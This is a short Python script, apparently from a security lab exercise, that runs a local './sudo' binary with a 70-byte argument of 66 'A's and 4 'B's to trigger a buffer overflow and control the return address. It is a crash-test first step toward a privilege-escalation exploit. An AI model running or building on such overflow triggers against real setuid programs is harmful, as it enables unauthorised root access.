import os, sys


PATH_TO_SUDO = './sudo'


def get_crash_arg():
   return ('A'*66 + 'B'*4)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_crash_arg());


if __name__ == '__main__':
    main(sys.argv)
